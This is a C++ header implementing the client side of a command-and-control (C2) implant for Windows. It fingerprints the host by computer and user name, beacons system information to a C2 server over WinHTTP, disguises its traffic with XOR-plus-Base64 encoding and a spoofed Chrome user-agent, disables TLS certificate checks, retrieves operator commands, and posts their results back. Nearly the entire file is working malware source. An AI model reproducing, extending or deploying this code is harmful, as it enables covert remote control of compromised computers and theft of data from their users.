#ifndef C2CLIENT_H
#define C2CLIENT_H

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "winhttp.lib")

using namespace std;

static const string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

inline string base64Encode(const string &data)
{
    string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    int in_len = data.size();
    const unsigned char *bytes_to_encode = (const unsigned char *)data.c_str();

    while (in_len--)
    {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3)
        {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            ret += base64_chars[char_array_4[j]];
        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

inline string base64Decode(const string &encoded_string)
{
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    string ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/')))
    {
        char_array_4[i++] = encoded_string[in_];
        in_++;
        if (i == 4)
        {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;
        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

        for (j = 0; (j < i - 1); j++)
            ret += char_array_3[j];
    }

    return ret;
}

inline string xorEncrypt(const string &data, const string &key)
{
    string result;
    for (size_t i = 0; i < data.length(); i++)
    {
        result += data[i] ^ key[i % key.length()];
    }
    return result;
}

inline string xorDecrypt(const string &data, const string &key)
{
    return xorEncrypt(data, key);
}

class C2Client
{
private:
    wstring c2Server;
    wstring agentID;
    DWORD beaconInterval;
    bool isActive;
    DWORD maxRetries;
    DWORD connectTimeout;
    DWORD requestTimeout;

    // Generate unique agent ID from machine fingerprint (ComputerName + Username)
    wstring generateAgentID()
    {
        wchar_t compName[256];
        wchar_t userName[256];
        DWORD size = 256;

        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        wstring raw = wstring(compName) + L"_" + wstring(userName);

        wstringstream ss;
        for (wchar_t c : raw)
        {
            ss << hex << (int)c;
        }

        return ss.str().substr(0, 16);
    }

    // Collect system info (ComputerName|Username|OSVersion)
    wstring getSystemInfo()
    {
        wchar_t compName[256], userName[256];
        DWORD size = 256;
        GetComputerNameW(compName, &size);
        size = 256;
        GetUserNameW(userName, &size);

        wstring osVersion = L"10.0.26200";

        wstringstream ss;
        ss << compName << L"|" << userName << L"|" << osVersion;

        return ss.str();
    }

    // HTTPS request with XOR+Base64 encryption
    wstring httpRequest(const wstring &endpoint, const wstring &data = L"")
    {
        wstring domain = c2Server;
        if (domain.find(L"https://") == 0)
        {
            domain = domain.substr(8);
        }
        else if (domain.find(L"http://") == 0)
        {
            domain = domain.substr(7);
        }

        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        wstring compName, userName;
        wchar_t buf[256];
        DWORD size = 256;

        GetComputerNameW(buf, &size);
        compName = buf;
        size = 256;
        GetUserNameW(buf, &size);
        userName = buf;

        string dataUtf8;
        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, data.c_str(), (int)data.length(), NULL, 0, NULL, NULL);
        if (utf8Len > 0)
        {
            dataUtf8.resize(utf8Len);
            WideCharToMultiByte(CP_UTF8, 0, data.c_str(), (int)data.length(), &dataUtf8[0], utf8Len, NULL, NULL);
        }

        wstring keyW = compName + userName + L"SecretKey2025";
        string key;
        utf8Len = WideCharToMultiByte(CP_UTF8, 0, keyW.c_str(), (int)keyW.length(), NULL, 0, NULL, NULL);
        if (utf8Len > 0)
        {
            key.resize(utf8Len);
            WideCharToMultiByte(CP_UTF8, 0, keyW.c_str(), (int)keyW.length(), &key[0], utf8Len, NULL, NULL);
        }

        string encrypted = xorEncrypt(dataUtf8, key);
        string encryptedBase64 = base64Encode(encrypted);

        // Initialize WinHTTP session with Chrome 120.0 User-Agent
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return L"";

        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &requestTimeout, sizeof(requestTimeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &requestTimeout, sizeof(requestTimeout));

        // Establish connection to C2 server
        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);
        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Initialize HTTPS request
        DWORD flags = WINHTTP_FLAG_SECURE;
        if (port == INTERNET_DEFAULT_HTTP_PORT)
        {
            flags = 0;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            endpoint.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Bypass SSL validation for self-signed certificates
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        // Set Content-Type header for binary payload
        wstring contentType = L"Content-Type: application/octet-stream";
        WinHttpAddRequestHeaders(hRequest, contentType.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

        vector<BYTE> postData;
        postData.reserve(encryptedBase64.size());
        for (char ch : encryptedBase64)
            postData.push_back((BYTE)ch);

        BOOL result = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            postData.data(),
            (DWORD)postData.size(),
            (DWORD)postData.size(),
            0);

        if (!result)
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return L"";
        }

        // Receive HTTP response
        WinHttpReceiveResponse(hRequest, NULL);

        // Read response body
        string respBytes;
        DWORD bytesRead = 0;
        BYTE buffer[8192];

        while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
        {
            respBytes.append((const char *)buffer, bytesRead);
        }

        wstring response;
        if (!respBytes.empty())
        {
            int wlen = MultiByteToWideChar(CP_UTF8, 0, respBytes.c_str(), (int)respBytes.size(), NULL, 0);
            if (wlen > 0)
            {
                response.resize(wlen);
                MultiByteToWideChar(CP_UTF8, 0, respBytes.c_str(), (int)respBytes.size(), &response[0], wlen);
            }
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (!response.empty())
        {
            wstring compName2, userName2;
            wchar_t buf2[256];
            DWORD size2 = 256;
            GetComputerNameW(buf2, &size2);
            compName2 = buf2;
            size2 = 256;
            GetUserNameW(buf2, &size2);
            userName2 = buf2;
            wstring key2W = compName2 + userName2 + L"SecretKey2025";

            int keyLen = WideCharToMultiByte(CP_UTF8, 0, key2W.c_str(), -1, NULL, 0, NULL, NULL);
            string key2(keyLen - 1, 0);
            WideCharToMultiByte(CP_UTF8, 0, key2W.c_str(), -1, &key2[0], keyLen, NULL, NULL);

            int respLen = WideCharToMultiByte(CP_UTF8, 0, response.c_str(), -1, NULL, 0, NULL, NULL);
            string responseUtf8(respLen - 1, 0);
            WideCharToMultiByte(CP_UTF8, 0, response.c_str(), -1, &responseUtf8[0], respLen, NULL, NULL);

            try
            {
                string decoded = base64Decode(responseUtf8);
                string decrypted = xorDecrypt(decoded, key2);

                int wLen = MultiByteToWideChar(CP_UTF8, 0, decrypted.c_str(), -1, NULL, 0);
                wstring result(wLen - 1, 0);
                MultiByteToWideChar(CP_UTF8, 0, decrypted.c_str(), -1, &result[0], wLen);
                return result;
            }
            catch (...)
            {
                return L"";
            }
        }

        return L"";
    }

public:
    // Constructor - initialize C2 with server URL and generate agent ID
    C2Client(const wstring &serverURL = L"https://127.0.0.1:8443")
    {
        c2Server = serverURL;
        agentID = generateAgentID();
        isActive = false;
    }

    // Test C2 connectivity via /api/ping
    bool testConnection()
    {
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession)
            return false;

        // Parse C2 URL
        wstring domain = c2Server;
        if (domain.find(L"https://") == 0)
            domain = domain.substr(8);
        else if (domain.find(L"http://") == 0)
            domain = domain.substr(7);

        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        size_t portPos = domain.find(L':');
        if (portPos != wstring::npos)
        {
            port = (INTERNET_PORT)_wtoi(domain.substr(portPos + 1).c_str());
            domain = domain.substr(0, portPos);
        }

        HINTERNET hConnect = WinHttpConnect(hSession, domain.c_str(), port, 0);
        if (!hConnect)
        {
            WinHttpCloseHandle(hSession);
            return false;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect, L"POST", L"/api/ping", NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        if (!hRequest)
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                              SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                              SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        BOOL result = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
        if (result)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        return result == TRUE;
    }

    vector<wstring> checkIn()
    {
        vector<wstring> commands;

#ifdef _DEBUG
        wcout << L"[C2][checkIn] Starting checkIn()..." << endl;
#endif

        // Retry loop with backoff
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
#ifdef _DEBUG
                wcout << L"[C2][checkIn] Building payload (attempt " << (attempt + 1) << ")..." << endl;
#endif

                // Build payload: agentID|sysinfo
                wstring payload = agentID + L"|" + getSystemInfo();

#ifdef _DEBUG
                wcout << L"[C2][checkIn] Payload ready, calling httpRequest()..." << endl;
#endif

                wstring response = httpRequest(L"/api/checkin", payload);

#ifdef _DEBUG
                wcout << L"[C2][checkIn] httpRequest() completed, response length: " << response.length() << endl;
#endif

                // Parse newline-delimited commands
                if (response.empty())
                {
#ifdef _DEBUG
                    wcout << L"[C2][checkIn] Empty response from server" << endl;
#endif
                    if (attempt < maxRetries - 1)
                    {
                        Sleep(5000);
                        continue;
                    }
                    return commands;
                }

#ifdef _DEBUG
                wcout << L"[C2][checkIn] Parsing command response..." << endl;
#endif

                // Split by newline
                size_t pos = 0;
                while ((pos = response.find(L'\n')) != wstring::npos)
                {
                    wstring cmd = response.substr(0, pos);
                    if (!cmd.empty())
                    {
                        commands.push_back(cmd);
                    }
                    response.erase(0, pos + 1);
                }

                // Handle final command
                if (!response.empty())
                {
                    commands.push_back(response);
                }

#ifdef _DEBUG
                wcout << L"[C2][checkIn] Parsing complete, returning " << commands.size() << L" commands" << endl;
#endif

                return commands;
            }
            catch (...)
            {
#ifdef _DEBUG
                wcout << L"[C2][checkIn] Exception caught" << endl;
#endif
                if (attempt < maxRetries - 1)
                {
                    Sleep(5000);
                    continue;
                }
            }
        }

#ifdef _DEBUG
        wcout << L"[C2][checkIn] All retries exhausted, returning empty" << endl;
#endif

        return commands;
    }

    // Send command execution result to C2 with retry logic
    void sendResult(const wstring &commandID, const wstring &status, const wstring &output)
    {
        // Retry loop
        for (DWORD attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                // Build result payload
                wstring payload = agentID + L"|" + commandID + L"|" + status + L"|" + output;
                wstring response = httpRequest(L"/api/result", payload);

                if (!response.empty())
                {
                    return;
                }

                // Backoff before retry
                if (attempt < maxRetries - 1)
                {
                    Sleep(3000);
                }
            }
            catch (...)
            {
                // Network exception - retry
                if (attempt < maxRetries - 1)
                {
                    Sleep(3000);
                }
            }
        }
    }

    void setBeaconInterval(DWORD seconds)
    {
        beaconInterval = seconds * 1000;
    }

    DWORD getBeaconInterval() const
    {
        return beaconInterval;
    }

    wstring getAgentID() const
    {
        return agentID;
    }

    wstring getC2Server() const
    {
        return c2Server;
    }

    bool isRunning() const
    {
        return isActive;
    }

    void setActive(bool active)
    {
        isActive = active;
    }
};

#endif // C2CLIENT_H
